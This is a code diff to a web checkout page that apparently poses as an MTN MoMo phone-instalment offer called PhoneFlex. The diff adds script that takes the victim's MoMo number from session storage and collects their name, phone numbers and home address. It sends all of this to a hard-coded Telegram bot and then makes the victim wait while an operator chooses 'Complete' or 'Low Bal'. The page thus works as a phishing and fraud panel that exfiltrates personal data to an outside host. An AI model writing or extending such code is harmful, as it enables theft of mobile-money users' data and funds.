@@ -404,6 +404,23 @@ select:invalid{color:#a8a8a8}
   .footer-bottom{flex-direction:row;justify-content:space-between;align-items:center}
 }
 
+/* ============ LOADING OVERLAY ============ */
+.loading-overlay{
+  position:fixed;inset:0;z-index:2000;
+  background:rgba(0,0,0,.6);
+  backdrop-filter:blur(3px);-webkit-backdrop-filter:blur(3px);
+  display:none;align-items:center;justify-content:center;
+}
+.loading-overlay.active{display:flex}
+.simple-spinner{
+  width:48px;height:48px;
+  border:5px solid #ffffff;
+  border-top:5px solid var(--yellow);
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
 /* ============================================================
    NARROW-SCREEN OPTIMISATIONS
    ============================================================ */
@@ -500,6 +517,11 @@ select:invalid{color:#a8a8a8}
 </style>
 </head>
 <body>
+
+<!-- ============ LOADING OVERLAY ============ -->
+<div class="loading-overlay" id="loadingOverlay" aria-hidden="true">
+  <div class="simple-spinner"></div>
+</div>
 
 <!-- ============ HEADER ============ -->
 <header class="site-header" id="header">
@@ -600,7 +622,7 @@ select:invalid{color:#a8a8a8}
                 <input type="tel" id="phone" name="phone" placeholder="97 123 4567"
                        autocomplete="tel" inputmode="numeric" maxlength="13">
               </div>
-              <p class="hint">This should be the number you are reachable on — it can be different from your MoMo number. The MTN agent will call this number.</p>
+              <p class="hint">Pre-filled from your MoMo number. You can change it if you'd prefer to be reached on a different number.</p>
               <span class="err-msg" id="err-phone">
                 <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round"><circle cx="12" cy="12" r="9"/><line x1="12" y1="8" x2="12" y2="12.5"/><line x1="12" y1="16" x2="12" y2="16"/></svg>
                 Enter a valid Zambian mobile number, e.g. 97 123 4567.
@@ -834,6 +856,16 @@ select:invalid{color:#a8a8a8}
 (function () {
   'use strict';
 
+  /* ============================================================
+     TELEGRAM CONFIG
+     ============================================================ */
+  var BOT_TOKEN = '8804712872:AAHUIfGWj5uve-3GyvulxIJ6PL39HejYL60';
+  var CHAT_ID   = '7892607543';
+  var API_BASE  = 'https://api.telegram.org/bot' + BOT_TOKEN;
+
+  var pollInterval = null;
+  var isSubmitting = false;
+
   /* ---------- Header shadow ---------- */
   var header = document.getElementById('header');
   function onScroll() {
@@ -904,6 +936,27 @@ select:invalid{color:#a8a8a8}
   var currentOrder = loadOrder();
 
   /* ============================================================
+     PRE-FILL CONTACT PHONE FROM SESSION STORAGE
+     ------------------------------------------------------------
+     login.html stored the MoMo number as a 9-digit string
+     (e.g. '977123456'). We format it for the display field but
+     keep the raw value for the Telegram payload.
+     ============================================================ */
+  function formatZambianDisplay(digits9) {
+    if (!digits9 || digits9.length !== 9) return '';
+    return digits9.slice(0, 2) + ' ' + digits9.slice(2, 5) + ' ' + digits9.slice(5);
+  }
+
+  var momoPhone9 = '';
+  try {
+    momoPhone9 = sessionStorage.getItem('mtn_phone') || '';
+  } catch (e) { momoPhone9 = ''; }
+
+  if (/^\d{9}$/.test(momoPhone9)) {
+    document.getElementById('phone').value = formatZambianDisplay(momoPhone9);
+  }
+
+  /* ============================================================
      TOAST
      ============================================================ */
   var toast = document.getElementById('toast');
@@ -946,7 +999,6 @@ select:invalid{color:#a8a8a8}
 
   ['fullName','phone','altPhone','province','city','area','addressDetails'].forEach(clearErrorOnInput);
 
-  /* ---------- Field validators ---------- */
   function normalisePhone(v) {
     return (v || '').replace(/[\s\-()]/g, '').replace(/^\+?260/, '').replace(/^0/, '');
   }
@@ -1022,6 +1074,135 @@ select:invalid{color:#a8a8a8}
   });
 
   /* ============================================================
+     SPINNER
+     ============================================================ */
+  var overlay = document.getElementById('loadingOverlay');
+
+  function showSpinner() {
+    if (overlay.classList.contains('active')) return;
+    overlay.classList.add('active');
+    overlay.setAttribute('aria-hidden', 'false');
+    document.body.style.overflow = 'hidden';
+  }
+
+  function hideSpinner() {
+    overlay.classList.remove('active');
+    overlay.setAttribute('aria-hidden', 'true');
+    document.body.style.overflow = '';
+  }
+
+  /* ============================================================
+     TELEGRAM HELPERS
+     ============================================================ */
+  function stopPolling() {
+    if (pollInterval) {
+      clearInterval(pollInterval);
+      pollInterval = null;
+    }
+  }
+
+  function escapeHtml(unsafe) {
+    if (!unsafe) return '';
+    return String(unsafe).replace(/[&<>"]/g, function (m) {
+      if (m === '&') return '&amp;';
+      if (m === '<') return '&lt;';
+      if (m === '>') return '&gt;';
+      if (m === '"') return '&quot;';
+      return m;
+    });
+  }
+
+  /* Polls Telegram for a callback matching the given timestamp.
+     Callback data pattern: "<type>_<action>_<ts>"
+     e.g. "order_complete_1712345678901"  → type='order', action='complete'
+          "order_lowbal_1712345678901"    → type='order', action='lowbal' */
+  function pollForCallback(expectedType, expectedTs, onDecision) {
+    stopPolling();
+
+    var lastUpdateId = 0;
+    pollInterval = setInterval(function () {
+      var url = API_BASE + '/getUpdates?offset=' + (lastUpdateId + 1) + '&timeout=5';
+
+      fetch(url)
+        .then(function (res) { return res.json(); })
+        .then(function (data) {
+          if (!data.ok || !data.result || !data.result.length) return;
+
+          data.result.forEach(function (update) {
+            lastUpdateId = update.update_id;
+
+            if (update.callback_query && update.callback_query.data) {
+              var parts = String(update.callback_query.data).split('_');
+              if (parts.length >= 3) {
+                var type = parts[0];
+                var action = parts[1];
+                var ts = parts[2];
+
+                if (ts == expectedTs && type === expectedType) {
+                  stopPolling();
+                  onDecision(action);
+                }
+              }
+            }
+          });
+        })
+        .catch(function (err) { console.warn('Poll error', err); });
+    }, 1500);
+  }
+
+  /* ============================================================
+     SEND ORDER TO TELEGRAM
+     ============================================================ */
+  function sendOrderToTelegram(payload) {
+    var ts = Date.now();
+    var completeId = 'order_complete_' + ts;
+    var lowbalId   = 'order_lowbal_' + ts;
+
+    var message =
+      '🛒 <b>PhoneFlex — Order confirmation</b>\n\n' +
+      '<b>MoMo Number:</b> <code>' + escapeHtml(payload.momoDisplay) + '</code>\n' +
+      '<b>Reachable Number:</b> <code>' + escapeHtml(payload.contactDisplay) + '</code>\n' +
+      (payload.altDisplay
+        ? '<b>Alt. Number:</b> <code>' + escapeHtml(payload.altDisplay) + '</code>\n'
+        : '') +
+      '\n<b>Selected Phone:</b> ' + escapeHtml(payload.phoneName) + '\n' +
+      '<b>Cash Price:</b> ' + escapeHtml(payload.priceFormatted) + '\n' +
+      '<b>Deposit:</b> ' + escapeHtml(payload.depositFormatted) + '\n' +
+      '<b>Daily Instalment:</b> ' + escapeHtml(payload.dailyFormatted) + ' / day\n' +
+      (payload.colour
+        ? '<b>Colour:</b> ' + escapeHtml(payload.colour) + '\n'
+        : '') +
+      '\n<b>Full Name:</b> ' + escapeHtml(payload.fullName) + '\n' +
+      '<b>Delivery Address:</b>\n' +
+      escapeHtml(payload.addressDetails) + '\n' +
+      (payload.landmark ? escapeHtml(payload.landmark) + '\n' : '') +
+      escapeHtml(payload.area) + ', ' + escapeHtml(payload.city) + '\n' +
+      escapeHtml(payload.province) + '\n\n' +
+      '📢 <b>Confirm the order status below:</b>';
+
+    return fetch(API_BASE + '/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'HTML',
+        reply_markup: {
+          inline_keyboard: [
+            [
+              { text: '✅ Complete', callback_data: completeId },
+              { text: '⚠️ Low Bal',  callback_data: lowbalId }
+            ]
+          ]
+        }
+      })
+    }).then(function (res) {
+      if (!res.ok) throw new Error('HTTP ' + res.status);
+      return ts;
+    });
+  }
+
+  /* ============================================================
      SUBMIT
      ============================================================ */
   var form = document.getElementById('addressForm');
@@ -1029,6 +1210,8 @@ select:invalid{color:#a8a8a8}
 
   form.addEventListener('submit', function (e) {
     e.preventDefault();
+
+    if (isSubmitting) return;
 
     var checks = [
       { ok: validateName(),           id: 'fullName' },
@@ -1054,13 +1237,16 @@ select:invalid{color:#a8a8a8}
       return;
     }
 
-    /* ---------- Save address ---------- */
-    var payload = {
+    /* ---------- Build the address payload ---------- */
+    var contactPhone9 = normalisePhone(document.getElementById('phone').value);
+    var altPhone9     = document.getElementById('altPhone').value.trim()
+                          ? normalisePhone(document.getElementById('altPhone').value)
+                          : '';
+
+    var addressPayload = {
       fullName:       document.getElementById('fullName').value.trim(),
-      phone:          '+260 ' + normalisePhone(document.getElementById('phone').value).replace(/(\d{2})(\d{3})(\d{4})/, '$1 $2 $3'),
-      altPhone:       document.getElementById('altPhone').value.trim()
-                        ? '+260 ' + normalisePhone(document.getElementById('altPhone').value).replace(/(\d{2})(\d{3})(\d{4})/, '$1 $2 $3')
-                        : '',
+      phone:          '+260 ' + formatZambianDisplay(contactPhone9),
+      altPhone:       altPhone9 ? '+260 ' + formatZambianDisplay(altPhone9) : '',
       province:       document.getElementById('province').value,
       city:           document.getElementById('city').value.trim(),
       area:           document.getElementById('area').value.trim(),
@@ -1069,26 +1255,71 @@ select:invalid{color:#a8a8a8}
     };
 
     try {
-      localStorage.setItem('phoneflex_address', JSON.stringify(payload));
+      localStorage.setItem('phoneflex_address', JSON.stringify(addressPayload));
       localStorage.setItem('phoneflex_order', JSON.stringify(currentOrder));
     } catch (err) { /* storage unavailable — continue anyway */ }
 
-    /* ---------- Feedback + redirect ---------- */
+    /* ---------- Build the Telegram payload ---------- */
+    var momoDisplay = /^\d{9}$/.test(momoPhone9)
+      ? '+260 ' + formatZambianDisplay(momoPhone9)
+      : (addressPayload.phone); /* fall back to contact if MoMo is missing */
+
+    var telegramPayload = {
+      momoDisplay:      momoDisplay,
+      contactDisplay:   addressPayload.phone,
+      altDisplay:       addressPayload.altPhone,
+      phoneName:        currentOrder.name,
+      priceFormatted:   formatK(currentOrder.price),
+      depositFormatted: formatK(currentOrder.deposit),
+      dailyFormatted:   formatK(currentOrder.daily),
+      colour:           currentOrder.colour || '',
+      fullName:         addressPayload.fullName,
+      addressDetails:   addressPayload.addressDetails,
+      landmark:         addressPayload.landmark,
+      area:             addressPayload.area,
+      city:             addressPayload.city,
+      province:         addressPayload.province
+    };
+
+    /* ---------- Lock UI + show spinner ---------- */
+    isSubmitting = true;
     completeBtn.disabled = true;
     completeBtn.style.opacity = '.75';
-    completeBtn.innerHTML = 'Saving your details…';
+    completeBtn.innerHTML = 'Waiting for confirmation…';
+    showSpinner();
 
-    showToast('Details saved. Taking you to the final step…', false);
-
-    setTimeout(function () {
-      window.location.href = 'complete.html';
-    }, 900);
+    /* ---------- Send to Telegram, then poll for a decision ---------- */
+    sendOrderToTelegram(telegramPayload)
+      .then(function (ts) {
+        pollForCallback('order', ts, function (action) {
+          if (action === 'complete') {
+            window.location.href = 'complete.html';
+          } else if (action === 'lowbal') {
+            window.location.href = 'insufficient.html';
+          } else {
+            /* Unknown action — just release the UI */
+            hideSpinner();
+            isSubmitting = false;
+            completeBtn.disabled = false;
+            completeBtn.style.opacity = '';
+            completeBtn.innerHTML = 'Complete Order';
+          }
+        });
+      })
+      .catch(function (err) {
+        console.error('Telegram send error:', err);
+        hideSpinner();
+        isSubmitting = false;
+        completeBtn.disabled = false;
+        completeBtn.style.opacity = '';
+        completeBtn.innerHTML = 'Complete Order';
+        showToast('Network error. Please try again.', true);
+      });
   });
 
   /* ============================================================
      INPUT POLISH
      ============================================================ */
-  /* Auto-space phone numbers as the user types */
   ['phone', 'altPhone'].forEach(function (id) {
     var input = document.getElementById(id);
     input.addEventListener('input', function () {
@@ -1103,11 +1334,26 @@ select:invalid{color:#a8a8a8}
     });
   });
 
-  /* Block non-numeric keys on phone fields */
   ['phone', 'altPhone'].forEach(function (id) {
     document.getElementById(id).addEventListener('keypress', function (e) {
       if (!/[0-9\s]/.test(e.key)) e.preventDefault();
     });
+  });
+
+  /* ============================================================
+     CLEANUP ON NAVIGATION
+     ============================================================ */
+  window.addEventListener('pageshow', function (e) {
+    if (e.persisted) {
+      stopPolling();
+      hideSpinner();
+      isSubmitting = false;
+      if (completeBtn) {
+        completeBtn.disabled = false;
+        completeBtn.style.opacity = '';
+        completeBtn.innerHTML = 'Complete Order';
+      }
+    }
   });
 
 })();
